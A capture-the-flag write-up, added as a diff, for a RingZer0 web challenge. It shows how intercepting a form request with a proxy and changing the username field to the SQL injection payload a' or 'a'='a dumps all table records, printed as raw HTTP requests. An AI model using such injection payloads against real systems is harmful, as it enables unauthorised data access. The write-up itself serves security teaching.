@@ -1,0 +1,47 @@
+CHALLENGE
+Challenge Access list 
+
+SOLUTION
+For this challenge, there isn't an input field we can use to enter arbitrary input; only a dropdown menu. This is only a client-side restriction though, and because we control the client, it's not really restricting.
+
+We need to open up a proxy to inspect and change the requests that are sent out to the server. I use Burpsuite.
+
+Once the proxy is set up, we can try to see what happens when we submit "admin" through the website. This is the request that is sent:
+POST /challenges/2 HTTP/1.1
+Host: ringzer0team.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ringzer0team.com/challenges/2
+Cookie: PHPSESSID=evm10n67gbr9fteo3c86242043
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+username=admin
+
+The last line is the most important here. Using our proxy, we can change this to whatever we want and perform SQLi.
+
+The next step is to figure out what query is being run and how we can make it do what we want. It is my guess that there is a record in there somewhere that contains the info we need.
+
+Let's just try to get the page to show us all the records. The query is probably something like:
+SELECT username, group, description FROM users WHERE username='$username'
+
+We need to escape that input to make the WHERE-clause true for all records.
+$username: a' or 'a'='a
+
+The resulting request is:
+POST /challenges/2 HTTP/1.1
+Host: ringzer0team.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://ringzer0team.com/challenges/2
+Cookie: PHPSESSID=evm10n67gbr9fteo3c86242043
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+username=a' or 'a'='a
+
+We now see a list of all records in that table, and among them are several records that contain the flag.
